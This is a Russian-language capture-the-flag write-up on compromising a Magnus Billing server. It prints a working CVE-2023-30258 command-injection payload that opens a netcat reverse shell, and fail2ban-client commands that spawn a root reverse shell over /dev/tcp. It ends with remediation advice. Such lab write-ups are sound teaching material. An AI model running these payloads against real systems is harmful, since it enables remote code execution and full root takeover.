# Отчет по прохождению Billing

## 1. Разведка (Reconnaissance)

Сканирование Nmap выявило открытые порты:
- 80/tcp (Apache 2.4.62)
- 22/tcp (SSH)
- 3306/tcp (MySQL MariaDB 10.3.23)

Порт 80 ведет на страницу авторизации. В исходном коде страницы не обнаружено ничего интересного.

## 2. Фаззинг директорий и файлов

Фаззинг выявил множество директорий и файлов. Наиболее значимые:

```
LICENSE              (Status: 200) [Size: 7652]
archive              (Status: 301) [--> /mbilling/archive/]
assets               (Status: 301) [--> /mbilling/assets/]
cron.php             (Status: 200) [Size: 0]
fpdf                 (Status: 301) [--> /mbilling/fpdf/]
index.html           (Status: 200) [Size: 30760]
index.php            (Status: 200) [Size: 663]
lib                  (Status: 301) [--> /mbilling/lib/]
resources            (Status: 301) [--> /mbilling/resources/]
```

В найденных файлах обнаружены упоминания уязвимых версий библиотек:
- stripe/stripe-php "^6.37"
- Authorize.Net PHP SDK version 3.1.2
- `/mbilling/lib/mercadopago/cacert.pem`

Дефолтные учетные данные для Magnus Billing не подошли.

## 3. Эксплуатация (Exploitation)

Найден публичный эксплойт для **Magnus Billing System v7** (CVE-2023-30258). Уязвимость позволяет манипулировать параметром `democ` в скрипте `/mbilling/lib/icepay/icepay.php` для выполнения произвольных команд.

Был подготовлен и отправлен payload для получения reverse shell:

```bash
curl -s 'http://10.48.165.220/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.187.139 4444 >/tmp/f;'
```

После выполнения получен reverse shell.

### Результат:
```
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
```

Пользовательский флаг получен по пути `/home/magnus/user.txt`.

## 4. Эскалация привилегий

Проверка привилегий показала возможность выполнения команды `fail2ban-client` от root без пароля:

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/fail2ban-client
```

### Эксплуатация fail2ban-client

Был создан временный джейл и настроено действие `actionban` для выполнения reverse shell от root:

```bash
fail2ban-client add x
fail2ban-client set x addaction x
fail2ban-client set x action x actionban 'bash -c "bash -i >& /dev/tcp/192.168.187.139/4445 0>&1"'
fail2ban-client start x
fail2ban-client set x banip 999.999.999.999
```

После бана IP сработала команда `actionban`, и был получен reverse shell с правами root.

### Результат:
```
uid=0(root) gid=0(root) groups=0(root)
```

Root-флаг получен по пути `/root/root.txt`.

## 5. Итог

- Машина скомпрометирована через уязвимость CVE-2023-30258 в Magnus Billing.
- Выполнена эскалация привилегий через `fail2ban-client` с получением root-доступа.
- Получены оба флага: пользовательский и root.

### Использованные техники:
- Remote Code Execution (CVE-2023-30258)
- Reverse shell
- Эскалация через `fail2ban-client` (выполнение произвольной команды от root через actionban)

### Рекомендации:
- Обновить Magnus Billing до актуальной версии.
- Ограничить права пользователя `asterisk` на выполнение `fail2ban-client`.
- Настроить `fail2ban` для запрета создания новых джейлов непривилегированными пользователями.